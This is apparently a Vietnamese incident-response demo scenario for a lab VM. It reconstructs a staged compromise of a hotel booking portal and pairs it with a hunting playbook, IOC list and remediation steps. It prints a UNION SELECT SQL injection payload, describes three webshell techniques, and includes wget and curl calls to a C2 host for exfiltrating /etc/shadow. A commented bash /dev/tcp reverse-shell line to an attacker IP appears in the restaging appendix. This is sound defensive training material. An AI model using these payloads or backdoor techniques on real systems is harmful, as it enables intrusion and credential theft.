# Scenario B — SeaView Hotel Booking Portal Intrusion (kịch bản chi tiết cho demo AnalysisHub)

> Kịch bản điều tra **đầy đủ, khớp 100% hiện trường đã dàn trên VM thật**
> `velociraptor` — `192.168.200.156` (Ubuntu 24.04.4 LTS, kernel 6.8.0-136).
> Web app **đang chạy thật** (Apache 2.4.58 + PHP 8.3.6 + SQLite): `http://192.168.200.156/`.
> Mọi path/hash/giờ/credential là **ground truth thật** — chuỗi khai thác đã kiểm chứng end-to-end qua HTTP.
>
> Cặp với: [DEMO-HUNTING-STORYLINE.md](DEMO-HUNTING-STORYLINE.md) · [DEMO-HUNTING-TIMELINE-WORKFLOW.md](DEMO-HUNTING-TIMELINE-WORKFLOW.md).
> Ngày demo: **2026-07-22**. Múi giờ máy: **+07:00**.

---

## 0. Thẻ điều tra (Case card)

| Trường | Giá trị |
|---|---|
| **Case** | `IR-2026-B — SeaView Hotel Booking Portal Compromise` |
| **Host** | `velociraptor` · `192.168.200.156` · Ubuntu 24.04.4 · kernel 6.8.0-136 |
| **Ứng dụng** | **SeaView Hotel — Booking Portal** (PHP 8.3 + SQLite), có form đặt phòng + admin quản lý phòng |
| **Vector vào** | **SQL Injection** ở `search.php?q=` → lấy creds admin → **upload ảnh không kiểm tra** ở `/admin/rooms.php` |
| **Incident window** | **2026-07-21 21:15 → 2026-07-22 03:05** (+07:00) |
| **C2 / attacker** | IP `185.220.101.55` · domain `evil-update.com` · cổng reverse shell `4444` |
| **Dwell time** | ~5h45 (xâm nhập 21:24 → phát hiện 22/07 ~09:05) |
| **Credential lộ** | `admin:Summer2026!` · `reception:welcome1` (dump qua SQLi từ bảng `users`) |

---

## 1. Tóm tắt điều hành

Đêm 21/07, attacker phát hiện **lỗ hổng SQL Injection** trong chức năng tìm phòng (`search.php?q=`) của
SeaView Booking Portal, dùng **UNION SELECT** để **dump bảng `users`** và lấy hash MD5 của tài khoản admin.
Sau khi **crack** hash (`Summer2026!`), attacker **đăng nhập admin panel**, lợi dụng chức năng
**"Add Room — upload ảnh phòng" không kiểm tra định dạng** để **tải webshell** (`room_247.php` nguỵ trang ảnh)
vào web root, đạt **RCE dưới `www-data`**. Từ đó attacker **giấu thêm 2 backdoor** vào file PHP hợp lệ
(`includes/functions.php`, `includes/db.php`), **leo thang root**, cài **5+ cơ chế persistence** và
**tài khoản backdoor `support`**, rồi **exfil `/etc/shadow`** ra C2 rạng sáng 22/07 — gây spike outbound
mà NOC phát hiện lúc 02:47.

---

## 2. Kiến trúc & bối cảnh

```
Internet ──▶ [ Apache 2.4.58 + PHP 8.3.6 + SQLite — ĐANG CHẠY ]  http://192.168.200.156/
   SeaView Hotel — Booking Portal  (/var/www/html/)
     ├─ index.php            trang chủ, list phòng từ DB
     ├─ room.php?id=N        chi tiết phòng (dùng prepared statement — an toàn)
     ├─ search.php?q=        ⚠ TÌM PHÒNG — DÍNH SQL INJECTION (nối chuỗi thô)
     ├─ booking.php          (đặt phòng)
     ├─ admin/
     │    ├─ login.php       đăng nhập nhân viên (bảng users, md5)
     │    ├─ dashboard.php
     │    └─ rooms.php       ⚠ ADD ROOM — UPLOAD ẢNH KHÔNG VALIDATE → webshell
     ├─ includes/
     │    ├─ functions.php   ⚠ helper hợp lệ, bị CHÈN backdoor Tier-2 (obfuscated, header-gated)
     │    └─ db.php          ⚠ bootstrap DB hợp lệ, bị CHÈN backdoor Tier-3 (evasive)
     ├─ uploads/rooms/
     │    └─ room_247.php    ⚠ webshell Tier-1 nguỵ trang "room gallery" (attacker upload)
     ├─ assets/style.css
     └─ data/seaview.db      SQLite (rooms, bookings, users)  ← nguồn creds bị dump
```
Người dùng hợp lệ: `root`, `khoi` (uid 1000, sudo). Web chạy dưới `www-data` (uid 33).

### 2.1. Bộ 3 webshell (đã kiểm chứng chạy thật qua HTTP)

| Tier | File | Kỹ thuật | Kích hoạt | yarascan |
|---|---|---|---|---|
| **1** | `uploads/rooms/room_247.php` | nguỵ trang "room gallery", `system($_REQUEST['cmd'])` | `?cmd=id` | ✅ dễ (score 90) |
| **2** | `includes/functions.php` | obfuscated `eval(gzinflate(base64_decode()))` + **auth-gate bằng HTTP header** | header `X-Telemetry: s3ss10n` **và** `?q=id` | ✅ (score 80) — nhưng log-URL mù |
| **3** | `includes/db.php` | **evasive**: ghép tên hàm runtime `"sy"."st"."em"` + variable-function | `?ref=<base64(cmd)>` | ❌ né cả 2 engine → cần **AI Analysis** |

> Tier-1 do **upload** (foothold); Tier-2 & Tier-3 do attacker **chèn vào file legit sau khi có RCE**
> (stealth persistence, sống sót cả khi ảnh upload bị xoá). `mtime` lệch (21:40/21:42 vs app 2026-07-10)
> là dấu hiệu file core bị tamper.

---

## 3. GROUND TRUTH — Chuỗi tấn công đầy đủ (đã kiểm chứng)

| # | Giờ (+07) | Hành động | Chi tiết / payload thật | Dấu vết để lại | MITRE |
|---|---|---|---|---|---|
| 1 | 21:15 | Trinh sát web | `GET /`, `/room.php?id=1`, `/search.php?q=ocean` | access.log | T1595 |
| 2 | 21:22 | Dò SQLi (error-based) | `GET /search.php?q='` → lộ `SQL error: unrecognized token` | access.log (UA `sqlmap`) | **T1190** |
| 3 | 21:24 | **Khai thác SQLi (UNION)** | `?q=' UNION SELECT id,username,password,role FROM users-- ` → dump 2 users | access.log | **T1190** |
| 4 | 21:26 | Crack hash offline | md5 `e56f3bb5…` → `Summer2026!` | — | T1110.002 |
| 5 | 21:31 | **Đăng nhập admin** | `POST /admin/login.php` (admin/Summer2026!) → 302 | access.log, session | **T1078** |
| 6 | 21:34 | **Upload webshell** | `POST /admin/rooms.php` đẩy `room_247.php` (không validate đuôi) | `uploads/rooms/room_247.php` | **T1505.003** |
| 7 | 21:36 | RCE dưới www-data | `GET /uploads/rooms/room_247.php?cmd=id` → `uid=33` | access.log | T1059.004 |
| 8 | 21:40 | **Giấu backdoor obfuscated** (Tier-2) | chèn `eval(gzinflate(base64_decode()))` gated `X-Telemetry` vào `functions.php` | `includes/functions.php` (mtime 21:40) | T1505.003 / T1027 |
| 9 | 21:42 | **Backdoor evasive** (Tier-3) | chèn variable-function concat vào `db.php` | `includes/db.php` (mtime 21:42) | T1505.003 / T1027 |
| 10 | ~21:55 | **Leo thang root** (nghi local exploit / sudo) | *(cần xác minh — §7)* | — | **T1548 / T1068** |
| 11 | 22:02 | Tải cryptominer | webshell `?cmd=wget C2/kworker` → `/var/tmp/.cache/kworker` | file miner (SUID, chuỗi xmrig) | T1105 / T1496 |
| 12 | 22:05 | Reverse shell | `/dev/shm/.x` → C2:4444 | `/dev/shm/.x` (volatile) | T1059.004 |
| 13 | 22:08 | Persistence cron | `/etc/cron.d/apache-update` | file cron | T1053.003 |
| 14 | 22:10 | Persistence systemd | `sysupdate.service` (enabled) | unit file | T1543.002 |
| 15 | 22:12 | Persistence SSH key | append key vào `/root/.ssh/authorized_keys` | file | T1098.004 |
| 16 | 22:18 | Persistence profile.d | `/etc/profile.d/00-update.sh` | file | T1546.004 |
| 17 | 22:20 | Persistence SUID | `/tmp/.bd`, `/var/tmp/.cache/.bd` | SUID bash | T1548.001 |
| 18 | 22:25 | Tài khoản backdoor | `useradd support` + nhóm sudo; `.bash_history` | `/etc/passwd`, history | T1136.001 |
| 19 | 22:30 | Truy cập credential | `cat /etc/shadow` | history | T1003.008 |
| 20 | 03:00 (22/7) | **Exfil** | `tar czf /tmp/.loot.tgz /etc/passwd /etc/shadow; curl -T … C2` | `/tmp/.loot.tgz` | T1074 / T1041 |

**Kill-chain:** Recon → **SQLi (T1190)** → Cred Access(T1552/crack) → Valid Accounts(T1078) →
**Web Shell(T1505.003)** → PrivEsc(T1548) → Persistence(×6) → Cred Access(T1003) → Collection(T1074) → Exfil(T1041).

---

## 4. Bản đồ bằng chứng (Artifact inventory — hash thật)

**Lớp web (initial access & webshell):**
| Path | mtime | SHA-256 | Loại |
|---|---|---|---|
| `search.php` | 07-10 10:00 | `27430d78…b309143b5` | **SQLi vuln** (điểm vào) |
| `admin/rooms.php` | 07-10 10:00 | `9eafaa8d…f48a867e25` | **upload vuln** |
| `uploads/rooms/room_247.php` | **21-07 21:34** | `d450c507…e8897f40` | **webshell Tier-1** (uploaded) |
| `includes/functions.php` | **21-07 21:40** | `aa8bdb66…651175270` | **webshell Tier-2** (obfuscated/gated) |
| `includes/db.php` | **21-07 21:42** | `77ea45ab…e23f1570` | **webshell Tier-3** (evasive) |
| `data/seaview.db` | (runtime) | — | DB chứa creds bị dump |

**Lớp post-exploitation (persistence / privesc / exfil):**
| Path | mtime | SHA-256 | Loại |
|---|---|---|---|
| `/var/tmp/.cache/kworker` | 21-07 22:02 | `fe506fcc…553a01c` | miner (SUID) |
| `/dev/shm/.x` * | 21-07 22:05 | `007f05a6…5892132` | reverse shell |
| `/etc/cron.d/apache-update` | 21-07 22:08 | `d5339207…8abf5dc74` | cron persist |
| `/etc/systemd/system/sysupdate.service` | 21-07 22:10 | `ae39c3c3…cb3abc2e` | systemd persist |
| `/root/.ssh/authorized_keys` | 21-07 22:12 | `2ad00739…2bd80c5a` | SSH backdoor |
| `/etc/profile.d/00-update.sh` | 21-07 22:18 | `4e2ab8d1…985927a` | profile.d persist |
| `/tmp/.bd` · `/var/tmp/.cache/.bd` | 21-07 22:20 | `bc5945fe…1aaaef1` | SUID root shell |
| `/home/support/.bash_history` * | 21-07 22:25 | `52fd0130…7f7c2f7f` | lệnh attacker |
| `/tmp/.loot.tgz` * | 22-07 03:00 | `099fbbcf…0f96a9f` | staged loot |
| user `support` (uid 1001, nhóm **sudo**) | — | — | backdoor account |

> `*` = volatile (tmpfs / được tạo runtime) → **mất khi reboot**, re-stage theo §11 trước demo.

---

## 5. INTAKE — Sự cố được phát hiện (Timeline Node #1)

**02:47 (22/07) — NOC alert (Zabbix):** `velociraptor` outbound spike + CPU cao rạng sáng.
**09:05 (22/07) — DevOps (anh Minh), #OPS-2290:** phát hiện `room_247.php` trong `uploads/rooms/` team không
deploy; Search Console cảnh báo site spam; NOC báo outbound đêm qua. → SOC mở case `IR-2026-B` lúc 09:10.

**→ Timeline Node #1 (Add event):** `2026-07-22 02:47` · `manual` · `velociraptor` · `medium` ·
`"NOC alert: outbound spike + CPU cao"`.

---

## 6. Giả thuyết · Target · Câu hỏi điều tra

**Giả thuyết:** SQLi ở booking portal → lấy creds admin → upload webshell qua admin → RCE → giấu backdoor →
root → persistence → exfil `/etc/shadow`.

**Target:** host `velociraptor`; window `21-07 21:15 → 22-07 03:05`; artifact: web log (`access.log`),
web root (`/var/www/html` — webshell), persistence (cron/systemd/ssh/profile/SUID), user `support`, loot.

**Câu hỏi phải trả lời (IR objectives):**
1. Điểm vào ban đầu là gì & lúc nào? (Q-ENTRY → **SQLi**)
2. Attacker lấy được credential nào? (Q-CRED)
3. Webshell nằm ở đâu — có mấy cái? (Q-SHELL)
4. Đã leo root chưa & cách nào? (Q-PRIVESC)
5. Bao nhiêu persistence & tài khoản backdoor? (Q-PERSIST)
6. Dữ liệu gì bị lấy, exfil ra đâu? (Q-EXFIL)

---

## 7. HUNTING PLAYBOOK — từng bước trên AnalysisHub

### VÒNG 1 — Khung xương thời gian (ELK web-log)
**B1. ELK — access.log → Import ELK.** *(mảng hunting mới, mạnh nhất cho web attack)*
- Đẩy `/var/log/apache2/access.log` + `/var/log/auth.log` vào ELK.
- Hunt các dấu hiệu web-attack: `UNION SELECT`, `%27` (dấu `'`), `sqlmap` (User-Agent), `POST /admin/login.php`, `POST /admin/rooms.php`, `room_247.php?cmd=`.
- **Kỳ vọng:** thấy đúng chuỗi 21:22 (SQLi probe) → 21:24 (UNION dump) → 21:31 (admin login) → 21:34 (upload) → 21:36 (RCE).
- **Điền:** **Import ELK** → mỗi hit thành event có `@timestamp` thật. `initial-access/T1190`, `high`.
- **Trả lời:** Q-ENTRY, Q-CRED (attacker dump users), Q-SHELL (upload).

### VÒNG 2 — Hunt web root & post-exploitation
**B2. yarascan — webshell (web root).** ⭐ *bắt 2/3 tầng*
- `scan /var/www --scenario linux -o {{OUTDIR}}`
- **Kỳ vọng 2 hit:** `uploads/rooms/room_247.php` (Tier-1, `php_dynamic_exec_super` 90) + `includes/functions.php` (Tier-2, `php_eval_base64` 80). `includes/db.php` (Tier-3) **KHÔNG ra** → B2b.
- **Điền:** Save to Case + promote IOC (hash `d450c507…`, `aa8bdb66…`). `persistence/T1505.003 critical`.
- **Xác minh sống:** `curl ".../uploads/rooms/room_247.php?cmd=id"` → `uid=33`.

**B2b. AI Analysis — bắt Tier-3 evasive mà signature bỏ sót.** ⭐ *điểm nhấn giá trị AI*
- Tải `includes/db.php` (Files/Evidence) → **🧠 AI**. AI nhận ra tên hàm ghép runtime `"sy"."st"."em"` + `base64_decode($_GET['ref'])` gọi qua biến → webshell.
- Đối chiếu mtime: `db.php` sửa **21:42**, `functions.php` **21:40**, lệch cụm app `2026-07-10` → **file core bị tamper**.
- **Điền:** AI triage → timeline, promote IOC `77ea45ab…`. **Bài học:** signature bắt cái đã biết; AI phủ cái né tránh.

**B3. yarascan — reverse shell + miner + cron (ngoài web root).**
- `scan /tmp /dev/shm /var/tmp /etc/cron.d /etc/systemd/system --scenario linux --all-files -o {{OUTDIR}}`
- **Kỳ vọng:** `/dev/shm/.x` (`LIN_Reverse_Shell`), `apache-update` (`LIN_Persistence`), `kworker` (`LIN_CryptoMiner`).

**B4. Edge Forensics → Autoruns (native).** systemd `sysupdate.service`, cron `apache-update`, `profile.d/00-update.sh` (cờ `exec-from-world-writable`/`suspicious-command`). → Q-PERSIST.

**B5. LinPEAS — SUID / ssh key / backdoor user (điểm mù yarascan & Autoruns).**
- `linpeas.sh -a` → nêu SUID `/tmp/.bd`,`/var/tmp/.cache/.bd`,`kworker`; ssh key lạ trong `/root`; user `support` (uid 1001, **sudo**). → Q-PRIVESC, Q-PERSIST, Q-CRED (account).

**B6. Terminal / Files — xác minh + đọc DB/creds/history.**
```
sqlite3 /var/www/html/data/seaview.db "SELECT username,password,role FROM users;"   # creds bị dump
find / -perm -4000 -type f 2>/dev/null            # SUID
cat /root/.ssh/authorized_keys; getent group sudo # ssh key + support
cat /home/support/.bash_history                    # wget miner, cat shadow, tar loot, curl C2
```
→ Q-CRED, Q-EXFIL.

### VÒNG 3 — Chuẩn hoá & báo cáo
**B7.** Case → **Analyze Evidence** → **AI Rebuild (Append)** → xem **ATT&CK matrix** (đủ Initial Access→…→Exfil) → **AI Summary** → **Incident Report** + **Export STIX**.

---

## 8. Attack Timeline hoàn chỉnh (kết quả mong đợi)

| event_time | tactic / technique | sev | title | source |
|---|---|---|---|---|
| 07-22 02:47 | — | med | NOC alert: outbound spike | manual |
| 07-21 21:22 | initial-access / T1190 | high | SQLi probe `search.php?q='` (SQL error lộ) | elk |
| 07-21 21:24 | initial-access / T1190 | high | SQLi UNION dump bảng users | elk |
| 07-21 21:31 | defense-evasion / T1078 | high | Admin login thành công (admin) | elk |
| 07-21 21:34 | persistence / T1505.003 | critical | Upload webshell room_247.php qua admin | elk |
| 07-21 21:36 | execution / T1059.004 | high | RCE webshell `?cmd=id` → www-data | elk |
| 07-21 21:40 | persistence / T1027 | critical | Backdoor Tier-2 ẩn trong functions.php | ai |
| 07-21 21:42 | persistence / T1027 | critical | Backdoor Tier-3 ẩn trong db.php | ai |
| 07-21 ~21:55 | privilege-escalation / T1548 | critical | Leo thang root (nghi local exploit) | manual |
| 07-21 22:02 | impact / T1496 | high | Tải cryptominer kworker | ai |
| 07-21 22:05 | execution / T1059.004 | high | Reverse shell /dev/shm/.x → C2:4444 | ai |
| 07-21 22:08–22:20 | persistence / T1053,T1543,T1098,T1546,T1548 | high | 5 cơ chế persistence (cron/systemd/ssh/profile/SUID) | edge-forensics |
| 07-21 22:25 | persistence / T1136.001 | high | Backdoor user `support` + sudo | manual |
| 07-22 03:00 | exfiltration / T1041 | critical | tar `/etc/shadow` + curl ra C2 | manual |

---

## 9. IOC (sẵn sàng Export STIX)

**Webshell (SHA-256):**
- `d450c5072492292af47159d32db91b87cd3dbe690e6bc7826448ce16e8897f40` — room_247.php (Tier-1)
- `aa8bdb66a5fcbd4ac679a65b7105f97a0b55156ffe9d2a5f7616b4a651175270` — functions.php (Tier-2, gate `X-Telemetry: s3ss10n`)
- `77ea45ab57c3997493d537fc34b6dd7ac126db58c758500e4ccfdd96e23f1570` — db.php (Tier-3, trigger `?ref=base64(cmd)`)

**Post-exploitation (SHA-256):** kworker `fe506fcc…` · /dev/shm/.x `007f05a6…` · .bd `bc5945fe…` · loot.tgz `099fbbcf…`
**Web attack:** SQLi payload `' UNION SELECT id,username,password,role FROM users-- ` · UA `sqlmap/1.8`
**Credential lộ:** `admin:Summer2026!` (md5 `e56f3bb5392369b6468e744ab1da078b`) · `reception:welcome1` (`201f00b5…`)
**Paths:** `uploads/rooms/room_247.php` · `includes/{functions,db}.php` · `/dev/shm/.x` · `/etc/cron.d/apache-update` · `/etc/systemd/system/sysupdate.service` · `/root/.ssh/authorized_keys` · `/etc/profile.d/00-update.sh` · `/tmp/.bd` · `/var/tmp/.cache/{.bd,kworker}` · `/tmp/.loot.tgz`
**Network:** `185.220.101.55` · `evil-update.com` · cổng `4444`   **Account:** user `support` (uid 1001, sudo)

---

## 10. Kết luận & khắc phục

**Kết luận:** root-level compromise khởi nguồn từ **SQLi → upload webshell**. Dwell time ~5h45.
6 cơ chế persistence + backdoor account + 3 webshell. `/etc/shadow` & creds admin coi như **đã lộ**.

**Containment/Eradication:**
1. Cô lập host; chặn `185.220.101.55`/`evil-update.com`.
2. Vá SQLi (`search.php` → dùng prepared statement) + upload (`admin/rooms.php` → whitelist đuôi, lưu ngoài web root, random tên).
3. Xoá 3 webshell; diệt 6 persistence; `userdel -r support`.
4. **Đổi toàn bộ credential**: mọi user OS (`passwd`), tài khoản app (`admin`,`reception`), revoke ssh key.
5. Rebuild từ image sạch (root compromise → không tin host).

---

## 11. Phụ lục — Re-stage volatile & Reset lab

**Re-stage 3 file volatile trước demo** (sudo trên VM):
```bash
printf '%s\n' '#!/bin/bash' '# bash -i >& /dev/tcp/185.220.101.55/4444 0>&1 (SIMULATED)' 'echo sim-beacon' | sudo tee /dev/shm/.x >/dev/null
sudo chmod +x /dev/shm/.x
sudo cp /bin/bash /tmp/.bd && sudo chmod 4755 /tmp/.bd
sudo tar czf /tmp/.loot.tgz /etc/passwd /etc/hostname 2>/dev/null
sudo touch -d '2026-07-21 22:05:00' /dev/shm/.x; sudo touch -d '2026-07-21 22:20:00' /tmp/.bd; sudo touch -d '2026-07-22 03:00:00' /tmp/.loot.tgz
```
**Reset lab:**
```bash
sudo systemctl disable --now sysupdate.service; sudo rm -f /etc/systemd/system/sysupdate.service
sudo rm -f /etc/cron.d/apache-update /etc/profile.d/00-update.sh /dev/shm/.x /tmp/.bd /tmp/.loot.tgz
sudo rm -rf /var/tmp/.cache /var/www/html          # web app + 3 webshell
sudo sed -i '/attacker@evil/d' /root/.ssh/authorized_keys
sudo userdel -r support 2>/dev/null
sudo systemctl disable --now apache2; sudo apt-get purge -y apache2 php php-sqlite3   # gỡ web server (tuỳ chọn)
```

---

## 12. Ma trận phát hiện (artifact → tool nào bắt)

| Artifact | ELK log | yarascan | Edge Forensics | LinPEAS | AI Analysis |
|---|:--:|:--:|:--:|:--:|:--:|
| SQLi (search.php) | ✅ `UNION SELECT` | — | — | — | ✅ |
| Admin login bất thường | ✅ POST login | — | — | — | — |
| room_247.php (Tier-1) | ✅ `?cmd=` | ✅ | — | — | ✅ |
| functions.php (Tier-2 gated) | ⚠ header-gated | ✅ | — | — | ✅ |
| **db.php (Tier-3 evasive)** | — | ❌ né signature | — | — | ✅ **chỉ AI/manual** |
| reverse shell /dev/shm/.x | — | ✅ | Processes* | — | ✅ |
| cron/systemd/profile persist | — | ✅(cron) | ✅ | ✅ | ✅ |
| **ssh key / SUID / user support** | — | ❌ | ❌ | ✅ | ✅ |
| exfil loot / outbound | ✅ outbound | — | — | ✅(susp) | ✅ |

> **Bài học demo:** một chuỗi tấn công thật cần **nhiều lớp hunting** — ELK cho web-attack (SQLi/login/upload),
> yarascan cho webshell file-content, Edge Forensics cho persistence có cấu trúc, LinPEAS cho điểm mù
> (SUID/ssh/user), **và AI Analysis cho webshell né tránh (Tier-3)**. Không tool đơn lẻ nào phủ hết.
